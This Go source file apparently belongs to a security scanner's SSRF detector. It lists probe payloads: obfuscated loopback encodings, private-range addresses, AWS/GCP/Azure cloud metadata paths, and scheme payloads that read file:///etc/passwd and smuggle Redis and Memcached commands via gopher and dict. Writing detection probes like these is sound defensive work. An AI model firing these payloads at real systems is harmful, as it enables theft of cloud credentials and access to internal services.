package ssrf

// DefaultAuthHeaderName/DefaultAuthHeaderFormat are the header name/value
// format used to carry an auth token, absent a WithAuthHeader override.
// Same convention as authbypass.DefaultAuthHeaderName/Format, duplicated
// rather than imported so this package doesn't depend on a sibling
// detector package.
const (
	DefaultAuthHeaderName   = "Authorization"
	DefaultAuthHeaderFormat = "Bearer {token}"
)

// loopbackEncodings returns 127.0.0.1 in every form an app that
// string-matches only the canonical "127.0.0.1" would fail to catch —
// decimal, octal, hex, IPv6 loopback, and IPv4-mapped IPv6. Each is its own
// explicit probe, not folded into one canonical form, per
// docs/13-implementation-plan-ph4.md Step 2's design.
func loopbackEncodings() []string {
	return []string{
		"127.0.0.1",
		"2130706433",         // decimal
		"0177.0.0.1",         // octal
		"0x7f000001",         // hex
		"[::1]",              // IPv6 loopback
		"[::ffff:127.0.0.1]", // IPv4-mapped IPv6
	}
}

// internalNetworkSamples are one representative address per RFC1918 private
// range — not exhaustive, a sample per range is enough to prove the class
// of bug exists.
func internalNetworkSamples() []string {
	return []string{"10.0.0.1", "172.16.0.1", "192.168.0.1"}
}

// cloudMetadataTarget is the link-local metadata address shared by AWS,
// GCP, and Azure's instance metadata services.
const cloudMetadataTarget = "169.254.169.254"

// cloudMetadataPaths are checked against cloudMetadataTarget as a bare GET
// — deliberately not provider-header-gated. A pure single-URL-parameter
// SSRF vector only lets the attacker control the fetched URL string, never
// the headers or method of the target's own outbound request, so
// GCP's Metadata-Flavor/Azure's Metadata:true requirements and AWS
// IMDSv2's PUT-for-token flow structurally cannot be satisfied through this
// vector — only a bare, unauthenticated GET can. That still catches a real,
// common misconfiguration (IMDSv1, or a metadata proxy that doesn't enforce
// the header), it just can't prove absence of the vulnerability against a
// provider that does enforce it. See this package's doc comment.
func cloudMetadataPaths() []string {
	return []string{
		"/latest/meta-data/",                        // AWS
		"/computeMetadata/v1/",                      // GCP
		"/metadata/instance?api-version=2021-02-01", // Azure
	}
}

// schemeBasedPayloads probe scheme-based SSRF — more severe (local file
// read) and more distinctive (protocol smuggling to an internal service)
// than HTTP-to-internal-HTTP, so these get their own check rather than
// being folded into the internal-target family.
func schemeBasedPayloads() []string {
	return []string{
		"file:///etc/passwd",
		"gopher://127.0.0.1:6379/_INFO", // Redis INFO via gopher smuggling
		"dict://127.0.0.1:11211/stat",   // Memcached stat via dict
	}
}
